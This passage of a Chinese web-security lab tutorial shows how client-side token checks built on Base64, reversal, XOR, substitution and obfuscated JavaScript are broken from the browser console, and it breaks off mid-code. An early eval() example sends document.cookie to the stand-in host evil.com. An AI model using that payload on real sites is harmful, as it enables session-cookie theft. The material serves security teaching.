+<h4 id="步骤5：利用eval-执行任意代码"><a href="#步骤5：利用eval-执行任意代码" class="headerlink" title="步骤5：利用eval()执行任意代码"></a>步骤5：利用eval()执行任意代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果应用允许用户输入影响eval()</span></span><br><span class="line"><span class="title function_">executeCommand</span>(<span class="string">&#x27;alert(&quot;XSS&quot;)&#x27;</span>);</span><br><span class="line"><span class="title function_">executeCommand</span>(<span class="string">&#x27;fetch(&quot;http://evil.com/?cookie=&quot; + document.cookie)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤6：提取完整的JavaScript代码"><a href="#步骤6：提取完整的JavaScript代码" class="headerlink" title="步骤6：提取完整的JavaScript代码"></a>步骤6：提取完整的JavaScript代码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有全局变量</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">window</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有函数</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">window</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span>[key] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key + <span class="string">&#x27;:&#x27;</span>, <span class="variable language_">window</span>[key].<span class="title function_">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>token被简单编码或混淆，但可以破解。</p>
+<h3 id="前端代码分析-1"><a href="#前端代码分析-1" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ Medium难度：简单混淆 ★★★</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法1：Base64编码（极易破解）</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// btoa() - 将字符串编码为Base64</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// atob() - 将Base64解码为字符串</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> encodedToken = <span class="string">&quot;c3VjY2Vzcw==&quot;</span>; <span class="comment">// Base64(&quot;success&quot;)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">checkPhrase</span>(<span class="params">input</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：解码逻辑在客户端 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// atob() - Base64解码</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 攻击者可以轻易破解</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> decoded = <span class="title function_">atob</span>(encodedToken);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (input === decoded) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法2：简单的字符串操作（毫无安全性）</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> obfuscatedToken = <span class="string">&quot;sseccus&quot;</span>; <span class="comment">// &quot;success&quot;的反转</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">validateInput</span>(<span class="params">input</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：反转逻辑暴露 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 攻击者可以看到split().reverse().join()</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 轻易推断出原始值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> token = obfuscatedToken.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> input === token;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法3：简单的XOR加密（不安全）</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">xorEncrypt</span>(<span class="params">str, key</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ★★★ XOR操作 ★★★</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// charCodeAt() - 返回字符的Unicode码</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// String.fromCharCode() - 从Unicode码创建字符</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ^ - XOR运算符</span></span></span><br><span class="line"><span class="language-javascript">        result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span><br><span class="line"><span class="language-javascript">            str.<span class="title function_">charCodeAt</span>(i) ^ key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>)</span></span><br><span class="line"><span class="language-javascript">        );</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> result;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> key = <span class="string">&quot;mykey&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> encryptedToken = <span class="title function_">xorEncrypt</span>(<span class="string">&quot;success&quot;</span>, key);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">verifyPhrase</span>(<span class="params">input</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：加密密钥和算法都在客户端 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> decrypted = <span class="title function_">xorEncrypt</span>(encryptedToken, key);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> input === decrypted;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法4：简单的字符替换</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> substitutionMap = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;x&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;z&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> cipherToken = <span class="string">&quot;xyzxyzz&quot;</span>; <span class="comment">// &quot;success&quot;经过替换</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">checkToken</span>(<span class="params">input</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> plainToken = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：替换表完全暴露 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 攻击者可以轻易反向操作</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> cipherToken) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(substitutionMap)) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (value === char) &#123;</span></span><br><span class="line"><span class="language-javascript">                plainToken += key;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> input === plainToken;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 表单提交</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;phrase&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 使用混淆的验证函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="title function_">checkPhrase</span>(phrase) || <span class="title function_">validateInput</span>(phrase) ||</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">verifyPhrase</span>(phrase) || <span class="title function_">checkToken</span>(phrase)) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;&lt;p style=&quot;color:green;&quot;&gt;✓ Correct!&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;&lt;p style=&quot;color:red;&quot;&gt;✗ Wrong!&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>Base64编码</strong> - 对token进行Base64编码</li>
+<li><strong>字符串反转</strong> - 简单的字符串操作</li>
+<li><strong>XOR加密</strong> - 简单的加密算法</li>
+<li><strong>字符替换</strong> - 替换映射表</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：所有”加密”和”混淆”都在客户端！</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端混淆 ≠ 安全</span><br><span class="line">客户端加密 ≠ 安全</span><br><span class="line">客户端验证 ≠ 安全</span><br></pre></td></tr></table></figure>
+
+<p><strong>问题清单：</strong></p>
+<ol>
+<li>编码&#x2F;加密算法完全暴露</li>
+<li>密钥存储在JavaScript中</li>
+<li>攻击者可以直接调用解密函数</li>
+<li>可以在Console中测试破解</li>
+</ol>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：Base64解码"><a href="#方法1：Base64解码" class="headerlink" title="方法1：Base64解码"></a>方法1：Base64解码</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中</span></span><br><span class="line"><span class="keyword">var</span> encodedToken = <span class="string">&quot;c3VjY2Vzcw==&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> decoded = <span class="title function_">atob</span>(encodedToken);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decoded); <span class="comment">// &quot;success&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：反转字符串"><a href="#方法2：反转字符串" class="headerlink" title="方法2：反转字符串"></a>方法2：反转字符串</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中</span></span><br><span class="line"><span class="keyword">var</span> obfuscatedToken = <span class="string">&quot;sseccus&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> token = obfuscatedToken.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token); <span class="comment">// &quot;success&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：XOR解密"><a href="#方法3：XOR解密" class="headerlink" title="方法3：XOR解密"></a>方法3：XOR解密</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复制xorEncrypt函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">xorEncrypt</span>(<span class="params">str, key</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        result += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">            str.<span class="title function_">charCodeAt</span>(i) ^ key.<span class="title function_">charCodeAt</span>(i % key.<span class="property">length</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用相同的密钥解密</span></span><br><span class="line"><span class="keyword">var</span> key = <span class="string">&quot;mykey&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> decrypted = <span class="title function_">xorEncrypt</span>(encryptedToken, key);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decrypted); <span class="comment">// &quot;success&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：反向替换"><a href="#方法4：反向替换" class="headerlink" title="方法4：反向替换"></a>方法4：反向替换</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建反向映射</span></span><br><span class="line"><span class="keyword">var</span> reverseMap = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(substitutionMap)) &#123;</span><br><span class="line">    reverseMap[value] = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="keyword">var</span> plainToken = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> cipherToken) &#123;</span><br><span class="line">    plainToken += reverseMap[char];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(plainToken); <span class="comment">// &quot;success&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法5：直接调用验证函数测试"><a href="#方法5：直接调用验证函数测试" class="headerlink" title="方法5：直接调用验证函数测试"></a>方法5：直接调用验证函数测试</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中暴力测试</span></span><br><span class="line"><span class="keyword">var</span> possibilities = [<span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">possibilities.<span class="title function_">forEach</span>(<span class="function"><span class="params">word</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">checkPhrase</span>(word)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Found:&#x27;</span>, word);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用更复杂的混淆和加密，但仍在客户端可破解。</p>
+<h3 id="前端代码分析-2"><a href="#前端代码分析-2" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ High难度：复杂混淆 ★★★</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法1：使用JavaScript混淆器（如javascript-obfuscator）</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 看起来像这样：</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> _0x1a2b=[<span class="string">&#x27;c3VjY2Vzcw==&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;fromCharCode&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">(<span class="keyword">function</span>(<span class="params">_0x4c3d8f,_0x1a2b3c</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _0x2d4e5a=<span class="keyword">function</span>(<span class="params">_0x6b7c8d</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">while</span>(--_0x6b7c8d)&#123;</span></span><br><span class="line"><span class="language-javascript">            _0x4c3d8f[<span class="string">&#x27;push&#x27;</span>](_0x4c3d8f[<span class="string">&#x27;shift&#x27;</span>]());</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">_0x2d4e5a</span>(++_0x1a2b3c);</span></span><br><span class="line"><span class="language-javascript">&#125;(_0x1a2b,<span class="number">0x12c</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> _0x2d4e=<span class="keyword">function</span>(<span class="params">_0x4c3d8f,_0x1a2b3c</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    _0x4c3d8f=_0x4c3d8f-<span class="number">0x0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _0x2d4e5a=_0x1a2b[_0x4c3d8f];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> _0x2d4e5a;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// ★★★ 问题：混淆不等于加密 ★★★</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 虽然难读，但逻辑仍在客户端</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 可以通过调试工具分析</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">_0x3f2a1b</span>(<span class="params">_0x5d8c2e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _0x7e9f3a=<span class="title function_">atob</span>(<span class="title function_">_0x2d4e</span>(<span class="string">&#x27;0x0&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> _0x5d8c2e===_0x7e9f3a;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 方法2：使用多层加密</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">tripleEncrypt</span>(<span class="params">str</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第一层：Base64</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> layer1 = <span class="title function_">btoa</span>(str);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 第二层：XOR</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> layer2 = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; layer1.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        layer2 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span></span><br><span class="line"><span class="language-javascript">            layer1.<span class="title function_">charCodeAt</span>(i) ^ <span class="number">0x42</span></span></span><br><span class="line"><span class="language-javascript">        